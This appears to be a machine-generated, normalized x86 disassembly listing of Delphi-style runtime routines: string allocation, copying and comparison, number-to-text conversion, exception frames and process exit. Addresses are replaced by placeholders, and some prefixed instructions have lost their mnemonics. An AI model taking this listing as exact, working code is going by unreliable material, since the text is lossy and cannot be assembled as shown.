mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403b84
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403bca
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403c24
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405c20
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403c48
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405c20
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403c70
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403c94
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403cf0
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403d20
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_4012a4
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_40126c
push eax
call sub_40128c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_40126c
push eax
call sub_40128c
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403dac
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403c94
call sub_403d20
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403b24
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403afc
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_4056ec
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403cf0
push eax
call sub_4012bc
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_403e9c
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_402754
pop eax
sub_403ec0
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402754
sub_403ef0
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_403f60
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_402930
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402754
sub_403f34
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402754
sub_403f60
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_402734
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_403f8c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_403f60
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_403e9c
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_402930
sub_403fbc
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_403fdc
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call sub_40131c
pop ebp
retn 0x4
sub_403ff8
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_403e9c
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_4044e8
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_403fbc
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_403fbc
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4044e8
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_403f8c
jmp r-xdata
sub_404094
xor ecx ecx
test edx edx
je r-xdata
jmp sub_403f8c
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_4040c4
xor ecx ecx
test edx edx
je r-xdata
jmp sub_403ff8
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_40410c
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_403f8c
not ecx
sub_404138
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_402930
pop ebx
retn
mov ecx ebx
sub_404164
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_403ef0
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_4044e8
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_4044e8
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_402930
pop edi
pop esi
pop ebx
retn
sub_4041a8
test edx edx
je r-xdata
mov edx ecx
jmp sub_403ef0
test ecx ecx
je sub_403ef0
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_404164
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_403f60
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_402930
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_402930
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_403ef0
pop edx
pop eax
jmp sub_404164
call sub_403ef0
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_40421c
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_403f60
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_4044e8
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_402930
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_403ef0
dec [ edx - 0x8 ]
sub_4042a8
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_404368
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_403f60
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_402930
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_402754
sub_4043bc
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_403e9c
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_403f8c
jmp r-xdata
pop ebx
retn 0x4
sub_4043fc
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_404368#2
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_402930
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_4044e8
mov edi ecx
sub_404444
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_4044e8
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_402930
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_402930
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_4044a0
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_4044e8
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_403e9c
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_403f60
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_402774
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_402930
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_404594
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call sub_40135c
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_4045b8
test edx edx
je sub_40457c
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_40457c
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402890
retn
sub_4045dc
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_40457c
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_4047c4
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_403fdc
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_403fdc
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4047c4
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404668
jmp r-xdata
sub_404668
test ecx ecx
je sub_40457c
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402890
pop edx
push [ edx ]
mov [ edx ] eax
call sub_40135c
retn
sub_40468c
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404668
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4046f4
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_404778
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_4046e8
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_404668
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_4047c4
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_40456c
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404554
mov ebx eax
mov eax [ edi ]
call sub_4046e8
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_402930
mov eax esi
sub_404808
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404838
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_404838
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404838
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404808
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402890
sub_4048cc
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404918
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404918
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_403ec0
jmp r-xdata
call sub_403e9c
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_404594
jmp r-xdata
call sub_40457c
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404900
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404918
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_4048cc
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_40575c
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_4050b0
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402890
sub_404a28
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_402930
mov edx [ eax + esi ]
add eax ebx
call sub_403ef0
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4045b8
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404a10
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_402930
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404b44
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404a28
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_405774
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_4050ec
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402890
sub_404b44
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_403ef0
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4045b8
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404a10
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404b44
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404a28
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_405774
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_4050ec
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402890
sub_404c44
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] ebx
mov eax [ esp ]
call sub_4046e8
mov edx eax
mov ecx esi
mov eax ebx
call sub_404c38
pop edx
pop esi
pop ebx
retn
sub_404c68
push ebx
push ecx
mov ebx eax
xor eax eax
mov [ esp ] eax
mov eax ebx
call sub_40415c
mov ecx eax
mov eax esp
mov edx ebx
call sub_4045dc
mov eax [ esp ]
pop edx
pop ebx
retn
sub_404c94
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404cb8
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] edx
mov esi eax
mov ebp 0x1
xor edi edi
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] 0x0
test esi esi
jne r-xdata
cmp [ esi + ebp - 0x1 ] 0x20
je r-xdata
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
inc ebp
mov [ esp + 0x10 ] 0x0
mov al [ esi + ebp - 0x1 ]
cmp al 0x2d
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp al 0x2b
jne r-xdata
mov [ esp + 0x10 ] 0x1
inc ebp
jmp r-xdata
mov bl 0x1
cmp [ esi + ebp - 0x1 ] 0x24
je r-xdata
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov al [ esi + ebp - 0x1 ]
call sub_402970
cmp al 0x58
je r-xdata
